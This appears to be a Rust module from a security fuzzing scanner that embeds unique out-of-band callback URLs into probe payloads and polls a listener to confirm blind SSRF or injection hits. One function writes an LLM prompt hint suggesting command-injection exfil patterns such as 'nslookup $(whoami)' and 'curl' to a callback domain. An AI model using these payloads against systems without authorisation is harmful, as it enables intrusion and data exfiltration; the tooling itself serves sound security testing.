//! Out-of-band (OAST) correlation: embed unique tokens and verify hits via listener API or env templates.

use crate::fuzz_http_pool::FuzzHttpPool;
use serde_json::json;
use std::time::Duration;
use uuid::Uuid;

const DEFAULT_HTTP_TIMEOUT_SECS: u64 = 12;

fn oast_embed_template() -> Option<String> {
    let t = std::env::var("WEISSMAN_OAST_EMBED_TEMPLATE").unwrap_or_default();
    let t = t.trim();
    if t.is_empty() {
        return None;
    }
    if !t.contains("{token}") {
        tracing::warn!(
            target: "fuzz_oob",
            "WEISSMAN_OAST_EMBED_TEMPLATE set but missing {{token}} placeholder; ignored"
        );
        return None;
    }
    Some(t.to_string())
}

fn oast_verify_url_template() -> Option<String> {
    let t = std::env::var("WEISSMAN_OAST_VERIFY_URL").unwrap_or_default();
    let t = t.trim();
    if t.is_empty() {
        return None;
    }
    if !t.contains("{token}") {
        tracing::warn!(
            target: "fuzz_oob",
            "WEISSMAN_OAST_VERIFY_URL must include {{token}}; ignored"
        );
        return None;
    }
    Some(t.to_string())
}

/// Canonical OAST DNS suffix: `WEISSMAN_OAST_DOMAIN` (preferred) or `WEISSMAN_OAST_BASE_DOMAIN` (legacy).
/// Empty if unset — no implicit default so local/dev runs do not phone home to production.
fn oast_base_domain() -> String {
    std::env::var("WEISSMAN_OAST_DOMAIN")
        .or_else(|_| std::env::var("WEISSMAN_OAST_BASE_DOMAIN"))
        .unwrap_or_default()
        .trim()
        .trim_end_matches('.')
        .to_lowercase()
}

/// Effective OAST DNS suffix when configured (for canary monitor URLs, etc.).
#[must_use]
pub fn oast_hook_domain() -> Option<String> {
    let d = oast_base_domain();
    if d.is_empty() {
        None
    } else {
        Some(d)
    }
}

/// One-line hint for LLM prompts (command injection / SSRF / DNS exfil) when an OAST domain is configured.
#[must_use]
pub fn oast_operator_prompt_hint() -> String {
    let d = oast_base_domain();
    if d.is_empty() {
        return String::new();
    }
    format!(
        "Operator OAST / blind callback domain: {d}. For SSRF, command injection, or DNS-based OOB only when appropriate, you may use subdomains of the form `<uuid>.{d}` (RFC DNS labels), e.g. conceptual patterns like `nslookup $(whoami).<uuid>.{d}` or `curl http://<uuid>.{d}/i` — use a fresh uuid-shaped placeholder per payload where the contract allows exfil to the operator collector."
    )
}

fn oast_listener_base_url() -> String {
    std::env::var("WEISSMAN_OAST_LISTENER_URL")
        .unwrap_or_else(|_| "http://127.0.0.1:9090".to_string())
        .trim()
        .trim_end_matches('/')
        .to_string()
}

fn oast_hit_marker() -> String {
    std::env::var("WEISSMAN_OAST_HIT_SUBSTRING")
        .unwrap_or_else(|_| "oob_hit".to_string())
        .trim()
        .to_string()
}

/// Built-in embed: `http://{token}.{WEISSMAN_OAST_DOMAIN|WEISSMAN_OAST_BASE_DOMAIN}/i` (path hit on Weissman OAST server).
fn builtin_embed_url(token: &str) -> Option<String> {
    let d = oast_base_domain();
    if d.is_empty() {
        return None;
    }
    Some(format!("http://{token}.{d}/i"))
}

/// Built-in verify: `{WEISSMAN_OAST_LISTENER_URL}/api/oast/status/{token}` (plain body contains marker when hit).
fn builtin_verify_url(token: &str) -> Option<String> {
    if oast_base_domain().is_empty() {
        return None;
    }
    Some(format!("{}/api/oast/status/{}", oast_listener_base_url(), token))
}

fn effective_embed_for_token(token: &str) -> Option<String> {
    if let Some(tpl) = oast_embed_template() {
        return Some(tpl.replace("{token}", token));
    }
    builtin_embed_url(token)
}

fn effective_verify_url(token: &str) -> Option<String> {
    if let Some(tpl) = oast_verify_url_template() {
        return Some(tpl.replace("{token}", token));
    }
    builtin_verify_url(token)
}

#[must_use]
pub fn oast_correlation_enabled() -> bool {
    (oast_embed_template().is_some() && oast_verify_url_template().is_some())
        || !oast_base_domain().is_empty()
}

/// OAST callback URL for embedding in probes (path/query/body), e.g. `http://{token}.oast.example/i`.
#[must_use]
pub fn oast_embed_url_for_token(token: &str) -> Option<String> {
    effective_embed_for_token(token)
}

/// Append / merge OAST URL into JSON body, form body, or suffix for raw string.
pub fn inject_oob_token(payload: &str, token: &str) -> String {
    let Some(url) = effective_embed_for_token(token) else {
        return payload.to_string();
    };
    let p = payload.trim();
    if p.starts_with('{') && p.ends_with('}') {
        if let Ok(mut v) = serde_json::from_str::<serde_json::Value>(p) {
            if let Some(m) = v.as_object_mut() {
                m.insert(
                    "weissman_oast_url".to_string(),
                    serde_json::Value::String(url.clone()),
                );
                if let Ok(s) = serde_json::to_string(&v) {
                    return s;
                }
            }
        }
    }
    if p.starts_with('<') && p.ends_with('>') {
        return format!(
            "{}\n<!-- weissman_oast: {} -->\n<weissman_oast_url>{}</weissman_oast_url>",
            payload, token, url
        );
    }
    if p.contains('=') && !p.starts_with('{') && looks_form(p) {
        format!("{payload}&weissman_oast_url={}", urlencoding::encode(&url))
    } else {
        format!("{payload}\n{url}")
    }
}

fn looks_form(s: &str) -> bool {
    s.split('&').take(3).all(|seg| seg.contains('='))
}

/// Poll verification endpoint once (uses rotating egress + optional Bearer).
pub async fn verify_oob_token_seen(pool: &FuzzHttpPool, token: &str) -> bool {
    let Some(url) = effective_verify_url(token) else {
        return false;
    };
    let marker = oast_hit_marker();
    if marker.is_empty() {
        return false;
    }
    let client = pool.client_for_probe();
    let mut req = client
        .get(&url)
        .timeout(Duration::from_secs(DEFAULT_HTTP_TIMEOUT_SECS))
        .header(
            "User-Agent",
            crate::fuzz_http_pool::random_fuzz_user_agent(),
        );
    if let Ok(k) = std::env::var("WEISSMAN_OAST_API_KEY") {
        let k = k.trim();
        if !k.is_empty() {
            req = req.header("Authorization", format!("Bearer {}", k));
        }
    }
    let Ok(resp) = req.send().await else {
        return false;
    };
    let Ok(txt) = resp.text().await else {
        return false;
    };
    txt.contains(&marker)
}

/// Bind each queued scan job to a unique `oast-{uuid}.<OAST_DOMAIN>` callback (path `/i`) for OOB correlation.
pub fn enrich_job_payload_with_oast_scan_binding(payload: &mut serde_json::Value) {
    let Some(domain) = oast_hook_domain() else {
        return;
    };
    let id = Uuid::new_v4();
    let label = format!("oast-{}", id.as_hyphenated());
    let dom = domain.trim().trim_end_matches('.');
    let host = format!("{label}.{dom}");
    let callback = format!("http://{host}/i");
    let Some(obj) = payload.as_object_mut() else {
        return;
    };
    obj.insert(
        "oast_scan_token".into(),
        json!(id.as_hyphenated().to_string()),
    );
    obj.insert("oast_scan_label".into(), json!(label));
    obj.insert("oast_scan_host".into(), json!(host));
    obj.insert("oast_scan_callback_url".into(), json!(callback));
}
